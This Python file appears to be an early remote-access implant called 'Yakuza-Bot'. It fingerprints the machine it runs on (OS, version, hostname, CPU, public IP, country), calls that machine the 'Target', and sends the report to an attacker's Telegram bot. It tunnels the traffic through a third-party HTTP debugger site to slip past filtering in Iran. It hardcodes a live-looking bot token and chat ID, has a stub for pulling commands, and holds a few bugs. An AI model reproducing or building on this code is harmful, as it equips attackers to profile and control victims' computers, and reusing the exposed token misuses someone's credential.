import requests
from bs4 import BeautifulSoup
import json
import time
import platform
import os
import subprocess
import wmi
import ngrok
from colorama import Fore, Back, Style
import ipapi

userIp  = ''
userLocation = ''
class TeleManager():
    def __init__(self, token, userId):
        self.lastCommand = ''
        self.token = token
        self.userId = userId
        self.userIp = ''
        self.userLocation = ''
    
    def send_message(self, msg):
        '''summary:
        this function send message to telegram bot ordinary Mode
        '''
        url = f'https://api.telegram.org/bot{self.token}/sendmessage?chat_id={self.userId}&text={msg}'
        
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print(Fore.LIGHTGREEN_EX + 'Message Sent Successfully on Normal Mode!')
                return True
            else:
                print(Fore.LIGHTRED_EX + 'Failed to send message. try again!!! Status code:' + Fore.LIGHTYELLOW_EX + response.status_code)
        except requests.RequestException:
            print(Fore.LIGHTRED_EX + 'Internet Connection Error!!!')
           
    def send_message_bypass_mode(self, msg): 
        '''summary:
        this function send message to telegram bot in Bypass Mode 
        this function can Filtering in iran
        '''
        url = 'https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx'
        payload = {
                'UrlBox':f'https://api.telegram.org/bot{self.token}/sendmessage?chat_id={self.userId}&text={msg}',
                'AgentList':'Internet Explorer',
                'VersionList':'HTTP/1.1',
                'MethodList':'GET'
            }
        
        response = requests.post(url, data=payload)
        
        if response.status_code == 200:
            print(Fore.LIGHTGREEN_EX + 'Message Sent Successfully!')
            return True
        
    def ip_enum(self):
        '''summary 
        this function obtain user ip and then send request to obtain user location
        then if User in Iran Show Warning Message
        this is internal function to check location for decide using normal sending or bypassing 
        '''
        global userIp
        global userLocation
        try:
            userIp = requests.get('https://api.ipify.org').text
        except requests.ConnectionError or requests.RequestException:
            print(Fore.LIGHTRED_EX + 'Cant Get machine IP address, seem Internet Connection Error')
            return False
        
        httpDebuggerUrl = 'https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx'
        payload = {
                'UrlBox':f'https://ipapi.co/{userIp}/country/',
                'AgentList':'Internet Explorer',
                'VersionList':'HTTP/1.1',
                'MethodList':'GET'
            }
        
        try:
            response = requests.post(httpDebuggerUrl, data=payload)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.content.decode(),'html.parser')
                
                #find <div id='ResultData'> tag contain result => User IP Country
                divTagResult = soup.findAll('div', attrs={'id':'ResultData'})
                
                #Conver tag finded to string then Slicing to extraxt Country Code 
                ipCountry = str(divTagResult)[151:-14].replace(' ','').replace("\n",'') 
                #Store IP Country in global variable userLocation
                userLocation = ipCountry
                
                #Print Warning message and Country Code
                if "IR" not in str(divTagResult):
                    return True
                else:
                    print(Fore.LIGHTGREEN_EX + f'You are in {ipCountry} Iran Unsupported Country => '+Fore.LIGHTCYAN_EX+f'So We Use Tunnel to sending Requests'+Style.RESET_ALL)
                    print(Fore.LIGHTYELLOW_EX+"Request send using Tunnel."+Style.RESET_ALL)
                    return False
                
                #Store Results and Return
                self.userIp = userIp
                self.userLocation = userLocation
                return {'ip':userIp,'country':userLocation} 

                    
        #Handle ip_eum() Errors
        except requests.ConnectionError or requests.RequestException:
            print(Fore.LIGHTRED_EX + 'Internet Connection Error!!!'+Style.RESET_ALL)
        except:
            print(Fore.LIGHTRED_EX + 'Unknown error in IP Location Checking happened...')
        
    def os_enum(self):
        '''summary:
        this function return os name, version, OS CPU and User Information
        then send it to T-Bot
        '''

        #Get User All Information
        userInfo = platform.uname()

        osCpu = subprocess.getoutput('wmic cpu get name')
        osCpuFormated = osCpu.replace('Name','').replace('\n','').replace(' ','')
        
        clienSideLoc = self.ip_enum()
        
        osEnum = f''' Enumeration Completed: ✅
            Target {userIp} in {userLocation} =>
            Operation System: {platform.system()} 💻
            OS Versions: {platform.version()} 🆚 => {platform.release()} 📦
            Host Name: {platform.uname().node} 
            OS CPU Family: {platform.processor()} => {platform.uname().machine}            
            OS CPU Model: {osCpuFormated}
            OS Detailed Version: {platform.win32_ver()}
            
            ---------------\\\\*******//---------------
            🥷 Hi Yakuza-Bot User 🥷👋
            Enter /list To See All Bot Commands 
            Enter /none to Run New Command
        '''
        print(osEnum)
        
        if clienSideLoc:
            self.send_message(osEnum)
        else:
            self.send_message_bypass_mode(osEnum)
        #sendMsg = self.send_message_bypass_mode(enumPm)
        return osEnum
        
    def last_command_bypass_mode(self):
        url = 'https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx'
        payload = {
                'UrlBox':f'https://api.telegram.org/bot{self.token}/getUpdates',
                'AgentList':'Internet Explorer',
                'VersionList':'HTTP/1.1',
                'MethodList':'GET'
            }

        response = requests.post(url, data=payload)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content.decode(),'html.parser')
            
            #result = soup.findAll('pre')
            result = soup.findAll('div', attrs={'id':'ResultData'})
            print(result)
            #lastCmd = 

def bot_runner():
    token = '7381866212:AAEh7VRd5sdOOz7tISehbaGsX0-y_lrc3os'
    #botUsername = 'davoodya_bot'
    #botUrl = f'https://api.telegram.org/bot{token}/GetUpdates'
    dayaId = '673330561'
    #msg = input(Back.MAGENTA+Fore.WHITE+'Enter your message: '+Style.RESET_ALL)
    
    telegram = TeleManager(token=token, userId=dayaId)
    #telegram.send_message_bypass_mode(msg)
    telegram.last_command_bypass_mode()

    

def main():
    bot_runner()
    print(f'[+] IP: {userIp} in {userLocation} Country')

if __name__ == '__main__':
    main()